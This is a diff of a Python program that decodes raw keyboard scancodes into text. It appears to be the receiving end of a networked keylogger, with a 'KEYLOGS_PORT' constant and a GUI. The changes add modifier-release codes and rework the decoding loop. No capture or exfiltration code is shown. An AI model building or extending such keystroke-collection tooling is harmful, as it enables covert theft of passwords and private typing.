@@ -5,6 +5,8 @@ import threading
 import queue
 import time
 
+#TODO map release shift
+
 codes = ("", "«ESC", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 
          '-', '=', "«BKSP»", "«TAB»", 'q', 'w', 'e', 'r', 't', 'y', 
          'u', 'i', 'o', 'p', '[', ']', "«ENTER»", "«CTRL»", 'a', 's', 
@@ -19,7 +21,7 @@ codes = ("", "«ESC", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
          "«CTRL_F5»", "«CTRL_F6»", "«CTRL_F7»", "«CTRL_F8»", "«CTRL_F9»",
          "«CTRL_F10»", "«ALT_F1»", "«ALT_F2»", "«ALT_F3»", "«ALT_F4»", "«ALT_F5»",
          "«ALT_F6»", "«ALT_F7»", "«ALT_F8»", "«ALT_F9»", "«ALT_F10»", "«CTRL_PRTSCR»",
-         "«CTRL_LEFT»", "«CTRL_RIGHT»", "«CTRL_END»", "«CTRL_PGDN»", "«ALT1»",
+         "«CTRL_LEFT»", "«CTRL_RIGHT»", "«CTRL_END»", "«CTRL_PGDN»", "«CTRL_HOME»", "«ALT1»",
          "«ALT2»", "«ALT3»", "«ALT4»", "«ALT5»", "«ALT6»", "«ALT7»", "«ALT8»", "«ALT9»",
          "«ALT0»", "«ALT-»", "«ALT=»", "«CTRL_PGUP»", "«F11»", "«F12»", "«SHIFT_F11»",
          "«SHIFT_F12»", "«CTRL_F11»", "«CTRL_F12»", "«ALT_F11»", "«ALT_F12»", "«CTRL_UP»",
@@ -27,7 +29,7 @@ codes = ("", "«ESC", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
          "«CTRL_DELETE»", "«CTRL_TAB»", "«CTRL/»", "«CTRL*»", "«ALT_HOME»", "«ALT_UP»",
          "«ALT_PGUP»", "", "«ALT_LEFT»", "", "«ALT_RIGHT»", "", "«ALT_END»",
          "«ALT_DOWN»", "«ALT_PGDN»", "«ALT_INSERT»", "«ALT_DELETE»", "«ALT/»",
-         "«ALT_TAB»", "«ALT_ENTER»")
+         "«ALT_TAB»", "«ALT_ENTER»", "«CTRL_RELEASED»", "«SHIFT_RELEASED»", "«ALT_RELEASED»")
 
 SCAN_PORT = 49323
 KEYLOGS_PORT = 49324
@@ -58,45 +60,38 @@ def decode_scancodes(string):
 
     out = ""
     for i in string:
-        if i & 0x80:        # released
-            print(f'released {codes[int(i & (~0x80))]}')
-            i &= ~0x80
-            if codes[int(i)] == "«CTRL»":
-                ctrl_on = False
-            elif codes[int(i)] in ("«LSHIFT»", "«RSHIFT»"):
-                shift_on = False
-            elif codes[int(i)] == "«ALT»":
-                alt_on = False
-        else:               # pressed
-            print(f'pressed {codes[int(i)]}')
-            if codes[int(i)] == "«CTRL»":
-                ctrl_on = True
-            elif codes[int(i)] in ("«LSHIFT»", "«RSHIFT»"):
-                shift_on = True
-            elif codes[int(i)] == "«ALT»":
-                alt_on = True
-            elif codes[int(i)] == "«CAPSLOCK»":
-                caps_on = not caps_on
+        if codes[int(i)] == "«CTRL»":
+            ctrl_on = True
+        elif codes[int(i)] in ("«LSHIFT»", "«RSHIFT»"):
+            shift_on = True
+        elif codes[int(i)] == "«ALT»":
+            alt_on = True
+        elif codes[int(i)] == "«CTRL_RELEASED»":
+            ctrl_on = False
+        elif codes[int(i)] == "«SHIFT_RELEASED»":
+            shift_on = False
+        elif codes[int(i)] == "«ALT_RELEASED»":
+            alt_on = False
+        elif codes[int(i)] == "«CAPSLOCK»":
+            caps_on = not caps_on
+        else:
+            if (shift_on or caps_on) and 'a' <= codes[int(i)] <= 'z':
+                out += codes[int(i)].upper()
+            elif shift_on and codes[int(i)] in shift_dict.keys():
+                out += shift_dict[codes[int(i)]]
+            elif alt_on:
+                out += "«ALT+"+codes[int(i)]+"»"
+            elif ctrl_on:
+                out += "«CTRL+"+codes[int(i)]+"»"
             else:
-                if (shift_on or caps_on) and 'a' <= codes[int(i)] <= 'z':
-                    out += codes[int(i)].upper()
-                elif shift_on and codes[int(i)] in shift_dict.keys():
-                    out += shift_dict[codes[int(i)]]
-                # elif shift_on:
-                #     out += "SHIFT+"+codes[int(i)]
-                elif alt_on:
-                    out += "«ALT+"+codes[int(i)]+"»"
-                elif ctrl_on:
-                    out += "«CTRL+"+codes[int(i)]+"»"
+                if codes[int(i)] == "«BKSP»" and interpret_bksp:
+                    out += '\b'
+                elif codes[int(i)] == "«ENTER»" and interpret_enter:
+                    out += '\n'
+                elif codes[int(i)] == "«TAB»" and interpret_tab:
+                    out += '\t'
                 else:
-                    if codes[int(i)] == "«BKSP»" and interpret_bksp:
-                        out += '\b'
-                    elif codes[int(i)] == "«ENTER»" and interpret_enter:
-                        out += '\n'
-                    elif codes[int(i)] == "«TAB»" and interpret_tab:
-                        out += '\t'
-                    else:
-                        out += codes[int(i)]
+                    out += codes[int(i)]
     return out
 
 class EntryFrame(ctk.CTkFrame):
